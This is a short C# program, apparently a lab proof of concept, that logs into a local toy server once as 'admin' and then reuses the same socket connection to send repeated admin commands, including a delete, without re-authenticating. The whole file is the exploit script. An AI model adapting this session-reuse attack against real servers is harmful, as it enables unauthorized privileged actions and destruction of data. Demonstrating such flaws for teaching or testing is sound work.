using System.Net.Sockets;
using System.Text;

namespace Attacker
{
    class Attacker
    {
        static void Main()
        {
            var s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            s.Connect(System.Net.IPAddress.Loopback, 9006);

            Console.WriteLine("[+] Connected to server");

            // STEP 1: Authenticate once as admin
            Send(s, "LOGIN:admin");

            Thread.Sleep(100);

            // STEP 2: Reuse same connection (no re-auth)
            for (int i = 0; i < 10; i++)
            {
                Send(s, "ADMIN_ACTION");
                
                //EXECUTE AS MUCH ADMIN ACTION REQUIRED
                if(i == 8)
                    Send(s, "ADMIN_ACTION_DELETE");

                Thread.Sleep(5000);
            }

            Console.WriteLine("[+] Finished exploit (no re-auth used)");

            s.Close();
            Console.ReadLine();
        }

        static void Send(Socket s, string msg)
        {
            byte[] data = Encoding.UTF8.GetBytes(msg + "\n");
            s.Send(data);

            byte[] buffer = new byte[1024];
            int received = s.Receive(buffer);

            string resp = Encoding.UTF8.GetString(buffer, 0, received).Trim();
            Console.WriteLine($"[RESP] {resp}");
        }
    }
}
